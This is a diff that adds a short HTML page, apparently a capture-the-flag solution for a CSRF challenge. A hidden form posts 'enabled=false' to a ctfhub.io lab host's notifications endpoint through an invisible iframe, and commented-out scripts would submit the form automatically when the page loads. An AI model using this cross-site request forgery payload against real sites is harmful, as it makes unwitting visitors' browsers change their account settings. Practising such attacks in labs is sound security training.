@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF 1</title>
+</head>
+<body>
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+    <h1>CSRF - GET parameter</h1>
+    <form id="csrf_form" action="https://0sqcbum40uc2.ctfhub.io/notifications" target="hiddenFrame">
+        <input type="text" name="enabled" value="false" hidden="true">
+    </form>
+
+    <!-- <form id="csrf_form" action="https://0sqcbum40uc2.ctfhub.io/notifications">
+        <input type="text" name="enabled" value="true" hidden="true">
+    </form>
+
+    <script>
+        document.getElementById("csrf_form").submit();
+    </script> -->
+
+    <!-- <script>
+        window.onload = function () {
+            document.getElementById("csrfForm").submit();
+        };      
+    </script> -->
+
+</body>
+</html>
